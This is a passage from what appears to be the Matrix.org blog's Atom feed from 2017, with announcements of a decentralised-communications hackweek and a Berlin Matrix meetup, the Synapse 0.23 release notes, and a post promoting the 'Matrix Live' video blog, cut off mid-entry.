&lt;p&gt;It&#x27;s well known Big Brother has been listening to our phone calls, reading texts and partnering with companies like Amazon or Google for a while now; more and more countries start censoring Internet - it&#x27;s not just China. Most &amp;quot;secure&amp;quot; communications solutions like Threema or Telegram suffer conceptual issues, like being unsecure-by-default or controlled by single commercial entity.
Decentralized systems - the proposed technical part of the solution - bring forth their own challenges: how do we conveniently identify an entity (considering revocation and squatting), and why do blockchains as innovative as Bitcoin and Ethereum churn through gigawatts of energy while handling miserable tens of transactions per second? What can serve as practical, scalable infrastructure for a decentralized network alternative to current Internet: on physical and channel levels, in terms of routing, etc.? How do we forge convenient XMPP, free Signal, a WhatsApp that can be both used universally and trusted?&lt;&#x2F;p&gt;
&lt;p&gt;How do we make the Internet less centralized and what can be done to make existing distributed technologies more popular? Why is Tor not enough and how long are we going to continue communicating in plaintext? How do we cook identity, and can we better consensus?&lt;&#x2F;p&gt;
&lt;p&gt;During the event we will discuss, hack, code, debug and develop - both systems (GNUnet, Tor, Matrix, etc.) and applications based on them, fix UX and write docs. The goal is to make a measurable contribution to solving some of the described problems through the course of the week, meet in person with the people tackling the issues you care about and return home with the desire to continue hacking.&lt;&#x2F;p&gt;
&lt;p&gt;Please register at our &lt;a href=&quot;https:&#x2F;&#x2F;gateway.ipfs.io&#x2F;ipns&#x2F;QmSgwwdejjsizQnKffKo6e84vfvBWCH5tnGpAwLPJVvhby&#x2F;&quot;&gt;website&lt;&#x2F;a&gt; if you&#x27;d like to come - also, if you&#x27;re not local, we are doing a group booking at a hostel and will be having some Berlin hacker community tours! (Use &lt;a href=&quot;https:&#x2F;&#x2F;gateway.ipfs.io&#x2F;ipfs&#x2F;QmSSmmDueDSGYparbzPuibQUnTmji3CTJX5MgvttBRbqUn&#x2F;&quot;&gt;this&lt;&#x2F;a&gt; if the first link didn&#x27;t work for you - that&#x27;s an IPNS issue and one thing in scope for the event.)&lt;&#x2F;p&gt;
&lt;p&gt;-- Dmitriy&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Announcing Matrix meetup in Berlin - Thursday October 19th!!</title>
        <published>2017-10-12T00:00:00+00:00</published>
        <updated>2017-10-12T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/10/12/announcing-matrix-meetup-in-berlin-october-19th/" type="text/html"/>
        <id>https://matrix.org/blog/2017/10/12/announcing-matrix-meetup-in-berlin-october-19th/</id>
        
        <content type="html">&lt;p&gt;Hi folks,&lt;&#x2F;p&gt;
&lt;p&gt;On October 19th (next Thursday, as of the time of writing) we&#x27;re going to be back in Berlin for various meetings - and we&#x27;re incredibly excited that &lt;a href=&quot;http:&#x2F;&#x2F;blueyard.com&#x2F;&quot;&gt;BlueYard&lt;&#x2F;a&gt; have offered to host the world&#x27;s first ever official &lt;a href=&quot;https:&#x2F;&#x2F;www.eventbrite.co.uk&#x2F;e&#x2F;matrix-and-friends-tickets-38729041606&quot;&gt;Matrix and Decentralised Communications Meetup&lt;&#x2F;a&gt; at their offices in Kreuzberg!  Matthew, Amandine and maybe others will be attending and speaking from the core team, and giving a VIP tour of the long-long-long-awaited Groups&#x2F;Communities features in Matrix and Riot as well as some of the other good stuff in the pipeline - and we&#x27;re also excited to have Exul joining us from the community to talk about his recent &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;exul&#x2F;matrix-rocketchat&quot;&gt;Matrix&amp;lt;-&amp;gt;Rocket.Chat&lt;&#x2F;a&gt; bridging adventures.  We&#x27;re also expecting some exciting folks to join us from the Ethereum community to talk about decentralised realtime comms in their ecosystem - plus if anyone wants to talk about other Matrix&#x2F;XMPP&#x2F;Tox&#x2F;Briar&#x2F;Richochet or similar projects please ping us and let us know asap!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;b&gt;Update: we&#x27;re excited to announce that &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;jFransham&quot;&gt;Jack Fransham&lt;&#x2F;a&gt; from &lt;a href=&quot;https:&#x2F;&#x2F;polkadot.network&#x2F;&quot;&gt;Polkadot&lt;&#x2F;a&gt; (who are &lt;a href=&quot;https:&#x2F;&#x2F;riot.im&#x2F;app&#x2F;#&#x2F;room&#x2F;#polkadot-watercooler:matrix.org&quot;&gt;very active&lt;&#x2F;a&gt; Riot&#x2F;Matrix users - and just raised &amp;gt;$130M in their token generation event yesterday) will also be joining us to tell us all about how Polkadot bridges together different blockchains!&lt;&#x2F;b&gt;. (The original speaker was Marek Kotewicz, but availability didn&#x27;t work out).&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;polkadot.network&#x2F;&quot;&gt;&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;10&#x2F;Screen-Shot-2017-10-16-at-21.50.57-300x83.png&quot; alt=&quot;&quot; width=&quot;300&quot; height=&quot;83&quot; class=&quot;aligncenter size-medium wp-image-2885&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;b&gt;Update 2: and our final speaker is confirmed as Maximilian Möhring, CEO of &lt;a href=&quot;https:&#x2F;&#x2F;keyp.io&#x2F;&quot;&gt;Keyp&lt;&#x2F;a&gt;, who&#x27;s going to talk about their self-sovereign decentralised identity system.&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;keyp.io&#x2F;&quot;&gt;&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;10&#x2F;Screen-Shot-2017-10-16-at-21.53.40-300x98.png&quot; alt=&quot;&quot; width=&quot;300&quot; height=&quot;98&quot; class=&quot;aligncenter size-medium wp-image-2884&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;b&gt;Update 3: ...and we have a last minute addition for a lightning talk from Secushare (Psyc + GNUnet, fully decentralised p2p encrypted comms)!!&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;secushare.org&quot;&gt;&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;10&#x2F;secushare-0444-300x200.png&quot; alt=&quot;&quot; width=&quot;200&quot; height=&quot;200&quot; class=&quot;aligncenter size-medium wp-image-2888&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.eventbrite.co.uk&#x2F;e&#x2F;matrix-and-friends-tickets-38729041606&quot;&gt;&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;10&#x2F;meetup.png&quot; alt=&quot;&quot; width=&quot;800&quot; height=&quot;400&quot; class=&quot;aligncenter size-full wp-image-2877&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Space is limited to 70 attendees, so &lt;a href=&quot;https:&#x2F;&#x2F;www.eventbrite.co.uk&#x2F;e&#x2F;matrix-and-friends-tickets-38729041606&quot;&gt;&lt;strong&gt;please register on Eventbrite&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt; asap if you&#x27;d like to come!&lt;&#x2F;p&gt;
&lt;p&gt;As a taster: the official video of our massive talk from the ETHLDN meetup a few weeks ago was just released (see below).  The meetup in Berlin will have different content and be more free-form, letting folks ask their own questions and steer the conversation and discussion as you see fit: so please come hang out in person, grab pizza and beer courtesy of BlueYard, and find the answers to all the deepest Matrix questions you never knew you even had...!&lt;&#x2F;p&gt;
&lt;p&gt;See you next week! :D&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;y0-j4Q77KXM&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse 0.23 is out!</title>
        <published>2017-10-02T00:00:00+00:00</published>
        <updated>2017-10-02T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/10/02/synapse-0-23-is-out/" type="text/html"/>
        <id>https://matrix.org/blog/2017/10/02/synapse-0-23-is-out/</id>
        
        <content type="html">&lt;p&gt;We&#x27;ve just released &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.23.0&quot;&gt;Synapse 0.23&lt;&#x2F;a&gt; - which contains a bunch of significant performance improvements, bug and stability fixes - as well as a few new features: basic spam checking (the ability to configure your homeserver to reject events which match arbitrary rules, both from users and other servers) - and long-awaited support for privacy-preserving (&#x27;event_id_only&#x27;) push notifications.  This means that apps can choose to register themselves to receive push notifications which do &lt;em&gt;not&lt;&#x2F;em&gt; contain any information about the actual push, but instead act as a simple &amp;quot;wake up!&amp;quot; event, which triggers the app to then sync via the client-server API in order to display the actual push notification details.  This is particularly useful for push notifications for E2E encrypted rooms, as it means the client has a chance of decrypting the message in order to display the push notification details in the UI (if the user wants that).  matrix-ios-sdk and matrix-android-sdk are in the process of being moved over to use the new &#x27;event_id_only&#x27; push format.&lt;&#x2F;p&gt;
&lt;p&gt;Long-awaited Communities&#x2F;Groups will land in Synapse 0.24, which should come quite soon (we&#x27;re almost ready to merge it to develop, but it&#x27;s a major update so we wanted to get 0.23 out the door first).&lt;&#x2F;p&gt;
&lt;p&gt;As always, you can get your latest Synapse from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&lt;&#x2F;a&gt; or a OS repository of your choice (we&#x27;ve just released the official Debian packages).&lt;&#x2F;p&gt;
&lt;h3 id=&quot;full-details-of-synapse-0-23&quot;&gt;Full details of Synapse 0.23:&lt;&#x2F;h3&gt;
&lt;p&gt;Features:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Add a frontend proxy worker (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2344&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;241327229&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2344&quot;&gt;#2344&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add support for event_id_only push format (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2450&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;258504959&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2450&quot;&gt;#2450&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add a PoC for filtering spammy events (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2456&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;258768438&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2456&quot;&gt;#2456&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add a config option to block all room invites (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2457&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;258801420&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2457&quot;&gt;#2457&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Changes:
&lt;ul&gt;
 	&lt;li&gt;Use bcrypt module instead of py-bcrypt (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2288&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;236667408&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2288&quot;&gt;#2288&lt;&#x2F;a&gt;) Thanks to &lt;a class=&quot;user-mention&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kyrias&quot;&gt;@kyrias&lt;&#x2F;a&gt;!&lt;&#x2F;li&gt;
 	&lt;li&gt;Improve performance of generating push notifications (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2343&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;241258390&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2343&quot;&gt;#2343&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2357&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;241976794&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2357&quot;&gt;#2357&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2365&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;242655038&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2365&quot;&gt;#2365&lt;&#x2F;a&gt;,
&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2366&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;242658178&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2366&quot;&gt;#2366&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2371&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;243026516&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2371&quot;&gt;#2371&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Improve DB performance for device list handling in sync (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2362&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;242317186&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2362&quot;&gt;#2362&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Include a sample prometheus config (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2416&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;250649035&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2416&quot;&gt;#2416&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Document known to work postgres version (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2433&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;254647605&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2433&quot;&gt;#2433&lt;&#x2F;a&gt;) Thanks to &lt;a class=&quot;user-mention&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ptman&quot;&gt;@ptman&lt;&#x2F;a&gt;!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Bug fixes:
&lt;ul&gt;
 	&lt;li&gt;Fix caching error in the push evaluator (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2332&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;240510018&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2332&quot;&gt;#2332&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix bug where pusherpool didn&#x27;t start and broke some rooms (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2342&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;241022132&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2342&quot;&gt;#2342&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix port script for user directory tables (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2375&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;244304452&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2375&quot;&gt;#2375&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix device lists notifications when user rejoins a room (PR &lt;a class=&quot;issue-link js-issue-link&quot; title=&quot;Send down device list change notif when member leaves&#x2F;rejoins room&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2443&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;255950357&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#2443&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2449&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;258504140&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2449&quot;&gt;#2449&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix sync to always send down current state events in timeline (PR &lt;a class=&quot;issue-link js-issue-link&quot; title=&quot;Don&#x27;t filter out current state events from timeline&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2451&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;258537401&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#2451&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix bug where guest users were incorrectly kicked (PR &lt;a class=&quot;issue-link js-issue-link&quot; title=&quot;Fix overzealous kicking of guest users&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2453&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;258560872&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#2453&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix bug talking to IPv6 only servers using SRV records (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2462&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;259840408&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2462&quot;&gt;#2462&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix regression in performance of syncs (PR &lt;a class=&quot;issue-link js-issue-link&quot; title=&quot;Refactor to speed up incremental syncs&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;2470&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;260340514&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#2470&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Matrix &quot;Live&quot;!</title>
        <published>2017-09-29T00:00:00+00:00</published>
        <updated>2017-09-29T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/09/29/matrix-live/" type="text/html"/>
        <id>https://matrix.org/blog/2017/09/29/matrix-live/</id>
        
        <content type="html">&lt;p&gt;Occasionally folks ask why we don&#x27;t update the blog more often - we&#x27;re infamous in only doing big formal updates once every 3 months, unless there&#x27;s something very specific to yell about.  However, it&#x27;s possible that some readers don&#x27;t realise that we have been publishing a weekly status update blog since July - albeit a video blog: &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;playlist?list=PLl5dnxRMP1hXZJtaE1Q3_ztrfIMJgrgZM&quot;&gt;Matrix Live&lt;&#x2F;a&gt;!  The episodes are published on YouTube (for now, although in future we&#x27;re going to use Matrix to distribute them), and are first made available to Quadratic ($5+) Patreon supporters.  After a week we make them public to everyone though and add them to the YouTube Playlist.  The videos also have very brief bullet-point summaries of the contents in the description for those who don&#x27;t have time to watch and just want to skim for interesting stuff.&lt;&#x2F;p&gt;
&lt;p&gt;We appreciate that video blogs are unusual for a FOSS project relative to written blogs - but we&#x27;ve chosen to go down this path because counterintuitively it takes much less time to just speak about what&#x27;s going on than write it down; for whatever reason my blogposts always seem to take hours to write as I get sucked into the details and try to be as comprehensive and accurate as possible.  Whereas just chatting about it with Amandine is much easier, and given that we do it anyway; why not film it for everyone&#x27;s benefit?  We always film the show in one continuous take (hence the &amp;quot;live&amp;quot;), so it&#x27;s literally only eating 10-15 mins out of our week.&lt;&#x2F;p&gt;
&lt;p&gt;Eitherway, just wanted to remind anyone who reads this blog that the video blog exists, and to gently encourage folks to donate at &lt;a href=&quot;https:&#x2F;&#x2F;patreon.com&#x2F;matrixdotorg&quot;&gt;Patreon&lt;&#x2F;a&gt; or &lt;a href=&quot;https:&#x2F;&#x2F;liberapay.com&#x2F;matrixdotorg&quot;&gt;Liberapay&lt;&#x2F;a&gt; if they want to get access to the videos on the day they air, rather than having to wait for a week!  Finally, we&#x27;d suggest that folks subscribe to the &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;playlist?list=PLl5dnxRMP1hXZJtaE1Q3_ztrfIMJgrgZM&quot;&gt;playlist&lt;&#x2F;a&gt; itself on YouTube even if they don&#x27;t donate, so they can be reminded about new eps.&lt;&#x2F;p&gt;
&lt;p&gt;So, without further ado, here&#x27;s an alarming montage of Matthew &amp;amp; Amandine geeking about Matrix, in case you&#x27;ve missed the show so far!&lt;&#x2F;p&gt;
&lt;div style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=a0n1xz4KRVE&quot;&gt;&lt;img class=&quot;alignnone wp-image-2844 size-full&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;ep1.jpg&quot; width=&quot;336&quot; height=&quot;188&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=0g2jEm84w8w&quot;&gt;&lt;img class=&quot;alignnone wp-image-2845 size-full&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;ep2.jpg&quot; width=&quot;336&quot; height=&quot;188&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=T9ENe3fzH6w&quot;&gt;&lt;img class=&quot;alignnone wp-image-2846 size-full&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;ep3.jpg&quot; width=&quot;336&quot; height=&quot;188&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=kG3Pa7BoUBY&quot;&gt;&lt;img class=&quot;alignnone wp-image-2847 size-full&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;ep4.jpg&quot; width=&quot;336&quot; height=&quot;188&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=bMt4rD86_wc&quot;&gt;&lt;img class=&quot;alignnone wp-image-2848 size-full&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;ep5.jpg&quot; width=&quot;336&quot; height=&quot;188&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=M4jjl4jxst4&quot;&gt;&lt;img class=&quot;alignnone wp-image-2849 size-full&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;ep6.jpg&quot; width=&quot;336&quot; height=&quot;188&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=S5u9haaQwzg&quot;&gt;&lt;img class=&quot;alignnone wp-image-2850&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;ep7.jpg&quot; width=&quot;336&quot; height=&quot;188&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=hX1bZWHwXWo&quot;&gt;&lt;img class=&quot;alignnone wp-image-2851 size-full&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;ep8.jpg&quot; width=&quot;336&quot; height=&quot;188&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=uFpcgj2HFoU&quot;&gt;&lt;img class=&quot;alignnone wp-image-2852&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;ep9.jpg&quot; width=&quot;336&quot; height=&quot;188&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=OuxP21lE-gg&quot;&gt;&lt;img class=&quot;alignnone wp-image-2853&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;ep10.jpg&quot; width=&quot;336&quot; height=&quot;188&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=9Iw2IaR_jpQ&quot;&gt;&lt;img class=&quot;alignnone wp-image-2854&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;ep11.jpg&quot; width=&quot;336&quot; height=&quot;188&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.patreon.com&#x2F;posts&#x2F;matrix-live-ep-14609414&quot;&gt;&lt;img class=&quot;size-full wp-image-2857&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;ep12.png&quot; alt=&quot;&quot; width=&quot;336&quot; height=&quot;188&quot; 